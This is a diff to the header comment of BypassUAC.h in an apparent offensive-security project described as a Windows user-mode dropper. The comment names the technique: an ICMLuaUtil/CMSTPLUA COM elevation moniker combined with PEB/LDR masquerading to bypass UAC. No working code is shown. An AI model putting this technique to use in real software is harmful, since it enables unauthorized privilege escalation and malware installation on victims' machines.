@@ -1,6 +1,27 @@
-
-/* ICMLuaUtil UAC Bypass PoC */
-
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows User-Mode Dropper
+ *  File     : BypassUAC.h
+ * ============================================================
+ *
+ *  Description:
+ *    Defines PEB, LDR entry, and RTL user process parameters
+ *    structures, the ICMLuaUtil COM vtable with its CLSID and
+ *    IID constants (CMSTPLUA elevation moniker), and auxiliary
+ *    types (LDR_CTX) required for the PEB/LDR masquerade
+ *    technique used during UAC bypass.
+ *
+ *  Purpose:
+ *    - Provide all necessary COM interface and NT internals
+ *      definitions for BypassUAC.c without importing
+ *      conflicting SDK headers.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
 
 #include <Windows.h>
 #include <winternl.h>
